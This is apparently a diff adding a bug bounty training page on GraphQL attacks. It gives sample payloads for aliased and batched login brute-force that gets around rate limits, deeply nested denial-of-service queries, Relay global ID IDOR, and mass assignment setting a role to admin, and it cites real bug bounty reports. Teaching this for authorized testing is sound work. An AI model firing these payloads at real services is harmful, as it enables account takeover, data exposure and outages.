@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GraphQL Security - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 4: Advanced &gt; GraphQL Security
+        </div>
+
+        <div class="page-header">
+            <h1>GraphQL Security</h1>
+            <p class="subtitle">
+                GraphQL特有のアタックサーフェス: Introspection、Batching、Nested Query DoS、
+                Resolver-level authorization bypass。HackerOne自身のIDOR $12,500等の高額報告多数。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>GraphQL Attack Surface Overview</h2>
+            <table>
+                <thead>
+                    <tr><th>Attack Category</th><th>Impact</th><th>Frequency</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Introspection leak</td><td>Information Disclosure</td><td>Very Common</td></tr>
+                    <tr><td>Authorization bypass (IDOR)</td><td>Data Exfiltration / Manipulation</td><td>Common</td></tr>
+                    <tr><td>Batching brute-force</td><td>Auth bypass, Rate limit bypass</td><td>Common</td></tr>
+                    <tr><td>Nested query DoS</td><td>Denial of Service</td><td>Moderate</td></tr>
+                    <tr><td>Mass assignment via mutations</td><td>Privilege Escalation</td><td>Moderate</td></tr>
+                    <tr><td>SQL/NoSQL injection in resolvers</td><td>Data Exfiltration</td><td>Less Common</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>1. Introspection & Schema Discovery</h2>
+
+            <h3>Full Introspection Query</h3>
+            <pre><code>{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name kind ofType { name } }
+        args { name type { name } }
+      }
+    }
+    mutationType { fields { name } }
+    queryType { fields { name } }
+  }
+}</code></pre>
+
+            <h3>When Introspection is Disabled</h3>
+            <p>多くのproductionサーバはintrospectionを無効化している。代替手法:</p>
+
+            <h4>Field Suggestion Attack</h4>
+            <pre><code>// Query with typo
+{ users { userna } }
+
+// Error response reveals suggestions:
+// "Did you mean 'username', 'usernames', 'user_name'?"
+// → Field names leaked via error messages</code></pre>
+
+            <h4>Error-based Discovery</h4>
+            <pre><code>// Test field existence
+{ user(id: 1) { password } }
+// "Field 'password' not found on type 'User'" → type name confirmed
+
+// Enumerate fields with wordlist
+{ user(id: 1) { secret_key } }
+{ user(id: 1) { api_token } }
+{ user(id: 1) { internal_notes } }
+// Fields that DON'T return "not found" exist but may be forbidden</code></pre>
+
+            <h4>Tools for Schema Discovery</h4>
+            <ul>
+                <li><strong>clairvoyance</strong>: Automated field name brute-forcing</li>
+                <li><strong>graphw00f</strong>: GraphQL engine fingerprinting</li>
+                <li><strong>InQL</strong>: Burp extension for GraphQL testing</li>
+                <li><strong>graphql-voyager</strong>: Schema visualization</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>2. Batching Attacks</h2>
+
+            <h3>Brute-force via Array Queries</h3>
+            <pre><code>// Single request, 1000 login attempts (bypasses rate limiting)
+[
+  {"query": "mutation { login(email:\"test@x.com\", password:\"pass001\") { token } }"},
+  {"query": "mutation { login(email:\"test@x.com\", password:\"pass002\") { token } }"},
+  {"query": "mutation { login(email:\"test@x.com\", password:\"pass003\") { token } }"},
+  // ... 997 more
+]
+// Server processes all in single HTTP request → rate limit counts as 1</code></pre>
+
+            <h3>Aliased Batching (single query body)</h3>
+            <pre><code>query {
+  a1: login(email: "test@x.com", password: "pass001") { token }
+  a2: login(email: "test@x.com", password: "pass002") { token }
+  a3: login(email: "test@x.com", password: "pass003") { token }
+  # ... hundreds of aliases in one query
+}</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">Rate Limit Bypass の本質</div>
+                <p>
+                    RESTでは1リクエスト=1操作だが、GraphQLでは1リクエスト内に複数操作を含められる。
+                    Rate limitingがHTTPリクエスト単位の場合、GraphQL batchingで完全bypass。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>3. Nested Query DoS</h2>
+            <pre><code>// Circular relationship exploitation
+query {
+  user(id: 1) {
+    posts {
+      author {
+        posts {
+          author {
+            posts {
+              author { # ... 100 levels deep
+                id
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+// Exponential database queries (N+1 problem amplified)
+// Without depth/complexity limits → server OOM / timeout</code></pre>
+
+            <h3>Detection of Limits</h3>
+            <pre><code>// Test progressively deeper nesting
+// Depth 5: OK
+// Depth 10: OK
+// Depth 15: "Query depth exceeds maximum" → limit found
+// Some servers use complexity scoring instead of pure depth</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>4. Authorization Bypass</h2>
+
+            <h3>Per-Resolver vs Global Authorization</h3>
+            <pre><code>// Common mistake: top-level resolver has auth check
+// But nested resolvers inherit parent context without re-checking
+
+query {
+  myProfile {  # Checks: is user authenticated? ✓
+    organization {  # No additional check
+      allMembers {  # Should check: is user admin? ✗ (MISSING)
+        email
+        phone
+        salary  # Sensitive field exposed
+      }
+    }
+  }
+}</code></pre>
+
+            <h3>IDOR via Node/Relay Global IDs</h3>
+            <pre><code>// Relay-style global IDs: base64 encoded type:id
+// "User:123" → base64 → "VXNlcjoxMjM="
+
+query {
+  node(id: "VXNlcjoxMjM=") {  # My user
+    ... on User { email phone }
+  }
+}
+
+// Change ID: "User:456" → "VXNlcjo0NTY="
+query {
+  node(id: "VXNlcjo0NTY=") {  # Another user → IDOR
+    ... on User { email phone ssn }
+  }
+}</code></pre>
+
+            <div class="callout danger">
+                <div class="callout-title">Global ID の罠</div>
+                <p>
+                    Relay global IDは一見不透明だが、base64デコードで構造が分かる。
+                    <code>atob("VXNlcjoxMjM=")</code> → <code>"User:123"</code>。
+                    Sequential IDなら全ユーザ列挙可能。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>5. Mutations: Mass Assignment</h2>
+            <pre><code>// Normal profile update
+mutation {
+  updateProfile(input: { name: "New Name" }) { id name }
+}
+
+// Mass assignment attempt
+mutation {
+  updateProfile(input: {
+    name: "Hacker"
+    role: "admin"           # ← hidden field
+    is_verified: true       # ← hidden field
+    credit_balance: 99999   # ← hidden field
+  }) { id name role }
+}
+// If input type includes these fields without validation → privilege escalation</code></pre>
+
+            <h3>Discovery: Introspect Input Types</h3>
+            <pre><code>{
+  __type(name: "UpdateProfileInput") {
+    inputFields {
+      name
+      type { name }
+    }
+  }
+}
+// Reveals ALL accepted fields including undocumented ones</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Real-World Reports</h2>
+
+            <div class="card">
+                <div class="card-title">HackerOne IDOR via GraphQL Mutation - #2122671 ($12,500)</div>
+                <p>
+                    HackerOne自身のGraphQL APIにおいて、<code>CreateOrUpdateHackerCertification</code> mutation を利用して
+                    別ユーザの Licenses/Certifications を削除可能な IDOR。
+                    Mutation の ownership check 不備を突いた破壊的操作。
+                </p>
+            </div>
+
+            <div class="card">
+                <div class="card-title">Shopify Billing IDOR via GraphQL Query - #2207248 ($5,000)</div>
+                <p>
+                    ShopifyのGraphQL query (<code>BillingDocumentDownload</code>, <code>BillDetails</code>) 経由で
+                    他ストアの課金情報を閲覧可能。Query resolver の ownership check が不足していた。
+                </p>
+            </div>
+
+            <div class="card">
+                <div class="card-title">GitLab: GraphQL Information Disclosure</div>
+                <p>
+                    Private repositoryのissue/MR情報がGraphQL nested queryから漏洩。
+                    REST APIでは適切にブロックされていたがGraphQL resolverに同等の制御がなかった。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Testing Checklist</h2>
+            <table>
+                <thead>
+                    <tr><th>#</th><th>Test</th><th>Tool</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Introspection enabled?</td><td>InQL / manual query</td></tr>
+                    <tr><td>2</td><td>Field suggestion on typo?</td><td>clairvoyance</td></tr>
+                    <tr><td>3</td><td>Batch query accepted?</td><td>Manual (JSON array)</td></tr>
+                    <tr><td>4</td><td>Aliased operations?</td><td>Manual</td></tr>
+                    <tr><td>5</td><td>Depth/complexity limits?</td><td>Nested query test</td></tr>
+                    <tr><td>6</td><td>Node/relay ID IDOR?</td><td>ID decode + enumerate</td></tr>
+                    <tr><td>7</td><td>Nested resolver auth?</td><td>Traverse relationships</td></tr>
+                    <tr><td>8</td><td>Mutation mass assignment?</td><td>Introspect InputTypes</td></tr>
+                    <tr><td>9</td><td>Subscription auth?</td><td>Subscribe to others' events</td></tr>
+                    <tr><td>10</td><td>Debug/trace mode?</td><td>Apollo tracing header</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Tools</h2>
+            <table>
+                <thead>
+                    <tr><th>Tool</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>InQL (Burp)</td><td>Schema extraction, query generation</td></tr>
+                    <tr><td>graphw00f</td><td>Engine fingerprinting (Apollo, Hasura, etc)</td></tr>
+                    <tr><td>clairvoyance</td><td>Field brute-force when introspection disabled</td></tr>
+                    <tr><td>BatchQL</td><td>Batching attack automation</td></tr>
+                    <tr><td>graphql-voyager</td><td>Schema relationship visualization</td></tr>
+                    <tr><td>Altair GraphQL Client</td><td>Interactive query building</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="page-nav">
+            <a href="43-websocket.html">&larr; Prev: WebSocket Attacks</a>
+            <a href="45-cache-poisoning.html">Next: Cache Poisoning &rarr;</a>
+        </div>
+
+        <div style="margin-top:2rem; text-align:center;">
+            <button class="complete-btn" data-module-id="44-gql" onclick="toggleComplete('44-gql')">Mark Complete</button>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
